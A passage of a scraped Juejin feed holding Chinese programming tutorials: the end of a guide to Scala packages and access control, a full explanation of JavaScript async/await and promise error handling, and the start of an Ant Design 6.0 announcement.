val userA = <span class="hljs-keyword">new</span> User(<span class="hljs-string">"A"</span>)
val userB = <span class="hljs-keyword">new</span> BUser(<span class="hljs-string">"B"</span>)  <span class="hljs-comment">// 无冲突</span>
</code></pre>
<h4 data-id="heading-18">（3）Scala 增强：按需导入（局部导入）</h4>
<p><code>import</code> 可在代码任意位置使用（不仅限于文件顶部），实现 “局部导入”（只在当前作用域生效），减少全局导入的冗余：</p>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-function">def <span class="hljs-title">test</span><span class="hljs-params">()</span>: Unit =</span> {
    <span class="hljs-comment">// 局部导入：只在 test() 方法内生效</span>
    <span class="hljs-keyword">import</span> com.example.model.User
    val user = <span class="hljs-keyword">new</span> <span class="hljs-built_in">User</span>(<span class="hljs-string">"局部导入"</span>)
  }
  
  <span class="hljs-comment">// 此处无法访问 User（超出局部导入作用域）</span>
}
</code></pre>
<h4 data-id="heading-19">（4）隐式导入（Implicit Import）</h4>
<p>Scala 会自动导入以下包，无需手动写 <code>import</code>：</p>
<ul>
<li><code>scala._</code>（Scala 核心类库，如 <code>List</code>、<code>Option</code>）；</li>
<li><code>scala.Predef._</code>（常用函数 / 常量，如 <code>println</code>、<code>String</code>、<code>Int</code>）；</li>
<li>当前包的包对象（如 <code>com.example</code> 包的代码会自动导入 <code>com.example.package</code>）。</li>
</ul>
<h3 data-id="heading-20">4. 包的访问控制</h3>
<p>Scala 的访问权限关键字（<code>private</code>、<code>protected</code>、<code>public</code>）可结合包使用，实现更精细的可见性控制（默认访问权限为 <code>public</code>，与 Java 一致）。</p>
<h4 data-id="heading-21">（1）private：私有访问</h4>
<ul>
<li>默认：<code>private</code> 修饰的元素只能在 <strong>当前类 / 对象内部</strong> 访问；</li>
<li>包级私有：<code>private[包名]</code> 修饰的元素可在 <strong>指定包及其子包</strong> 内访问（Scala 增强特性）。</li>
</ul>
<h5 data-id="heading-22">示例：包级私有</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包级私有类：只能在 com.example 包及其子包访问</span>
<span class="hljs-keyword">private</span>[example] <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-keyword">val</span> email: String)

<span class="hljs-comment">// 普通类（public）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> profile: UserProfile)
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def <span class="hljs-title function_">test</span><span class="hljs-params">()</span>: Unit = {
    <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"alice@example.com"</span>)  <span class="hljs-comment">// 合法：UserProfile 是 com.example 包级私有</span>
    <span class="hljs-type">val</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Alice"</span>, profile)
  }
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 外部包（com.other）：无法访问包级私有类</span>
<span class="hljs-keyword">package</span> com.other

<span class="hljs-keyword">import</span> com.example.model.UserProfile

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"test@example.com"</span>)  <span class="hljs-comment">// 编译报错：UserProfile 不可见</span>
}
</code></pre>
<h4 data-id="heading-23">（2）protected：受保护访问</h4>
<ul>
<li>默认：<code>protected</code> 修饰的元素只能在 <strong>当前类及其子类</strong> 访问（与 Java 一致）；</li>
<li>包级受保护：<code>protected[包名]</code> 修饰的元素可在 <strong>指定包及其子包 + 子类</strong> 访问。</li>
</ul>
<h5 data-id="heading-24">示例：包级受保护</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String) {
  <span class="hljs-comment">// 包级受保护方法：com.example 包及其子包 + User 子类可访问</span>
  <span class="hljs-keyword">protected</span>[example] def getDetail: String = s<span class="hljs-string">"User: <span class="hljs-variable">$name</span>"</span>
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.<span class="hljs-type">User</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> user = <span class="hljs-keyword">new</span> <span class="hljs-type">User</span>(<span class="hljs-string">"Alice"</span>)
    println(user.getDetail)  <span class="hljs-comment">// 合法：UserService 在 com.example 包下</span>
  }
}

<span class="hljs-comment">// 子类（无论是否在同一包）都可访问</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminUser</span>(<span class="hljs-params">name: <span class="hljs-type">String</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span>(<span class="hljs-params">name</span>) </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printDetail</span></span>: <span class="hljs-type">Unit</span> = println(getDetail)  <span class="hljs-comment">// 合法：子类继承 User</span>
}
</code></pre>
<h4 data-id="heading-25">（3）public：公开访问（默认）</h4>
<p>未显式指定访问权限的元素默认是 <code>public</code>，任何包都可访问（与 Java 一致）。</p>
<h3 data-id="heading-26">5. 包的最佳实践</h3>
<ol>
<li><strong>目录与包结构一致</strong>：严格遵循 “包名对应目录路径”，例如 <code>com.example.model</code> 对应 <code>src/main/scala/com/example/model</code>，避免编译器找不到类；</li>
<li><strong>包命名规范</strong>：全小写字母，用反向域名（如 <code>com.company.project</code>），避免中文、特殊字符；</li>
<li><strong>按功能拆分包</strong>：推荐分层结构（如 <code>controller</code>（接口）、<code>service</code>（业务）、<code>model</code>（数据）、<code>util</code>（工具）），而非按类类型拆分；</li>
<li><strong>合理使用包对象</strong>：只放包级公共资源（工具函数、常量），避免将业务逻辑放入包对象；</li>
<li><strong>最小权限原则</strong>：非公开的元素尽量用 <code>private[包名]</code> 或 <code>protected</code> 限制访问，减少耦合；</li>
<li><strong>简化导入</strong>：避免导入冗余（用局部导入、重命名、过滤），减少命名冲突。</li>
</ol>
<h2 data-id="heading-27">总结</h2>
<p>Scala 的包在核心功能（组织代码、避免冲突）上与 Java 一致，但提供了 <strong>嵌套包、包对象、灵活导入、包级访问控制</strong> 等增强特性，更适合复杂项目的模块化管理。关键要点：</p>
<ol>
<li>包结构必须与目录结构一致，否则编译报错；</li>
<li>包对象是 Scala 专属，用于存储包级公共资源；</li>
<li>访问控制可通过 <code>private[包名]</code> 实现包级可见性，比 Java 更灵活；</li>
<li>导入语法支持重命名、过滤、局部导入，简化代码编写。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[js中async和await 的详细讲解]]></title>    <link>https://juejin.cn/post/7575457788664528948</link>    <guid>https://juejin.cn/post/7575457788664528948</guid>    <pubDate>2025-11-24T04:00:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788664528948" data-draft-id="7576077034742759458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="js中async和await 的详细讲解"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-11-24T04:00:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我的div丢了肿么办"/> <meta itemprop="url" content="https://juejin.cn/user/1310273593440398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            js中async和await 的详细讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1310273593440398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我的div丢了肿么办
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:00:02.000Z" title="Mon Nov 24 2025 04:00:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</h4>
<p>async 函数永远会返回一个promise,即使你在函数中没有返回任何值。<br/>
因为：返回没有返回值时函数默认返回的是 undefined.<br/>
所以：会返回一个 promise，这个 promise 的 值为 undefined。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}

<span class="hljs-comment">// async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>, <span class="hljs-title function_">doThingFn</span>())

<span class="hljs-comment">// 输出的值是 undefined</span>
<span class="hljs-comment">// 因为async 函数会返回一个promise, 所以我们是可以写then的。</span>
<span class="hljs-title function_">doThingFn</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span>=&gt;</span>{
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'输出的值是'</span>,res)
})
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bceed9a3fe444f3899a47aceda0c4a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR55qEZGl25Lii5LqG6IK_5LmI5Yqe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561602&amp;x-signature=wMre96k%2FQuFIeVuMKlPeYCZ6b0s%3D" alt="image" loading="lazy"/></p>
<h4 data-id="heading-1">async 函数的返回是Promise.resolve</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}
</code></pre>
<p>等于与下面的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-comment">// 返回没有返回值时函数默认返回的是 undefined.</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">undefined</span>)
}
</code></pre>
<h4 data-id="heading-2">当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。因此需要被捕获</h4>
<p>下面依次输出的结果是：A</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'D'</span> )
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>为啥只会输出:A ？<br/>
因为当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。我们没有捕获，直接就会报错的。<br/>
因此下面的 C 不会输出。</p>
<h4 data-id="heading-3">为啥不会输出 C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>分析：当 await 遇到被拒绝的 Promise 时(就是说：Promise.reject)：<br/>
立即抛出异常，中断当前代码块的执行。<br/>
（如果有catch）, 直接跳转到最近的 catch 块<br/>
await 之后的代码不会执行,因此不会输出 C。</p>
<h4 data-id="heading-4">如何让他输出C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-comment">// 我们在这里将它捕获掉。这样就可以输出C</span>
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span>=&gt;</span>{
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
    })
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<h4 data-id="heading-5">如何正确获取到B的值</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
  },<span class="hljs-number">5000</span>)
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// 如何让这里正确获取到B的值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>这样就可以获取到值啦~~~</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
    },<span class="hljs-number">5000</span>)
  })
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// return new Promise(...) 是 timeOutFn 函数的返回值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>有的小伙伴会问：  resolve('B') 为啥不需要return<br/>
因为： resolve 是一个回调函数，它用来改变 Promise 的状态从 "pending" 到 "fulfilled"<br/>
调用 resolve('B') 只是通知 Promise 完成，并传递值 'B' 给后续的 .then() 或 await<br/>
return new Promise(...) 是 timeOutFn 函数的返回值<br/>
resolve('B') 是设置 Promise 的解析值，不是函数的返回值</p>
<h3 data-id="heading-6">await 不能单独使用，需要配合async一起使用。</h3>
<h4 data-id="heading-7">不要乱用await，因为 await 是基于 Promise 一起使用的(后面跟的是一个 Promise 对象)</h4>
<h4 data-id="heading-8">async 和 await 的语法规则</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1</span>, <span class="hljs-keyword">async</span> 是 <span class="hljs-keyword">function</span> 的一个前缀，只有 <span class="hljs-keyword">async</span> 函数中才能使用 <span class="hljs-keyword">await</span> 语法  
<span class="hljs-number">2</span>, <span class="hljs-keyword">async</span> 函数永远会返回一个promise,即使你在函数中没有返回任何值。  
<span class="hljs-number">3</span>, <span class="hljs-keyword">await</span> 后面跟的是一个 <span class="hljs-title class_">Promise</span> 对象，如果不是，则会包裹一层 <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()  
</code></pre>
<h4 data-id="heading-9">await和async的主要作用</h4>
<p>await和async 主要是用来优化处理回调地狱的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉 Ant Design 6.0 来了！ 🎉]]></title>    <link>https://juejin.cn/post/7575751471842230308</link>    <guid>https://juejin.cn/post/7575751471842230308</guid>    <pubDate>2025-11-24T03:37:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842230308" data-draft-id="7575937594350551083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉 Ant Design 6.0 来了！ 🎉"/> <meta itemprop="keywords" content="React.js,Ant Design"/> <meta itemprop="datePublished" content="2025-11-24T03:37:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zombieJ"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335924669"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉 Ant Design 6.0 来了！ 🎉
